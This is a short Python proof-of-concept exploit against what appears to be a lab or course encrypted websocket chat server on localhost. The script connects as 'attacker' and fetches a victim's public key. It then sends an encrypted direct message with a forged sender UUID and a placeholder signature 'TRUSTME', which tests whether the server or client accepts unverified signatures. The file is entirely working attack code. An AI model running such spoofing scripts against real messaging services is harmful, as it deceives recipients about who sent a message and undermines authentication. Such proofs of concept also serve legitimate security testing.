import asyncio, json, time, os, websockets
from utils.crypto import rsa_encrypt, b64url_der_to_pub

VICTIM = os.environ["VICTIM_UUID"]
async def main():
    async with websockets.connect("ws://127.0.0.1:8765") as ws:
        await ws.send(json.dumps({"type":"USER_HELLO","from":"attacker-0000-0000-0000-000000000000","payload":{}}))
        await ws.send(json.dumps({"type":"GET_PUBKEY","payload":{"user":VICTIM}}))
        pub = None
        while True:
            msg = json.loads(await ws.recv())
            if msg.get("type") == "PUBKEY_RESULT":
                pub = msg["payload"]["pub"]; break
        ct = rsa_encrypt(b64url_der_to_pub(pub), b"[spoofed] hello from a faked sender")
        payload = {"ciphertext": ct, "content_sig": "TRUSTME",
                   "from": "00000000-0000-0000-0000-000000000001", "to": VICTIM,
                   "ts": int(time.time()*1000)}
        await ws.send(json.dumps({"type":"MSG_DIRECT","from":"attacker-0000-0000-0000-000000000000","to":VICTIM,"payload":payload}))
        print("sent spoofed message with TRUSTME")
asyncio.run(main())
